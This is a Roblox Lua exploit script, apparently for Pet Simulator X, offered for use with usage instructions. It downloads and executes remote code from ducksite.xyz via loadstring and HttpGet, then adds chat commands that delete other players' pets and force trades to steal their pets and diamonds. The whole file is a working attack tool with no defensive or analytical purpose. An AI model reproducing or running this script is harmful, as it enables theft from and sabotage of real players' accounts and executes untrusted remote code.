-- Zyrex#5659
-- exploit not discovered by me

loadstring(game:HttpGet("https://ducksite.xyz/psx.lua"))() -- credits to duck

-- usage:

-- ;deletepets [plr1], [plr2], [plr3]...
-- ;deletepets all

-- ;stealpets [plr] [pet_limit]
-- ;stealdiamonds [plr]

local services = setmetatable({}, {__index = function(t, k)
    local v = game:GetService(k)
    t[k] = v
    return v
end})

local players = services.Players;
local localplayer = players.LocalPlayer;

local settings = { prefix = ";" };

local function get_player(str)
    local plr;
    for i,v in pairs(players:GetPlayers()) do
        pcall(function()
            local LowerName = v.Name:lower();
            local LowerDisplayName = v.DisplayName:lower();
            if LowerName:sub(1, #str) == str:lower() or LowerDisplayName:sub(1, #str) == str:lower() then
                plr = v;
            end
        end)
    end
    return plr;
end

local function get_others()
    local list = {}
    table.foreach(players:GetPlayers(), function(i, v)
        if v ~= localplayer then
            table.insert(list, v)
        end
    end)
    return list;
end

local commands = {
    deletepets = function(victims)
        local allplayers = ((victims[1] == "all" or victims[1] == "others") and get_others()) or nil;

        local playerlist = (function()
            if allplayers then return allplayers end;
            local list = {};
            for i,v in pairs(victims) do
                local plr = get_player(v);
                if plr then
                    table.insert(list, plr);
                end
            end
            return list;
        end)()

        for i,v in pairs(playerlist) do
            PSX.DeletePlayerPets(v);

            print("petx | deleted pets of " .. v.Name);
        end
    end,
    stealpets = function(args)
        local player = get_player(args[1])
        local petlimit = tonumber(args[2]) or 10;
        if player then
            print("petx | attempted to steal pets and diamonds " .. player.Name);
            PSX.ForceTrade(player, petlimit)
        end
    end,
    stealdiamonds = function(args)
        local player = get_player(args[1])
        if player then
            print("petx | attempted to steal diamonds from " .. player.Name);
            PSX.ForceTradeAllDiamonds(player)
        end
    end,
}

localplayer.Chatted:Connect(function(message)
    if message:sub(1, #settings.prefix) == settings.prefix then
        local command = message:sub(#settings.prefix + 1);
        local args = {};
        for word in command:gmatch("%S+") do
            table.insert(args, word);
        end
        local command_name = args[1];
        local command_args = {};
        for i = 2, #args do
            table.insert(command_args, args[i]);
        end
        local command_func = commands[command_name];
        if command_func then
            command_func(command_args);
        end
    end
end)

print("petx | loaded, prefix is " .. settings.prefix);
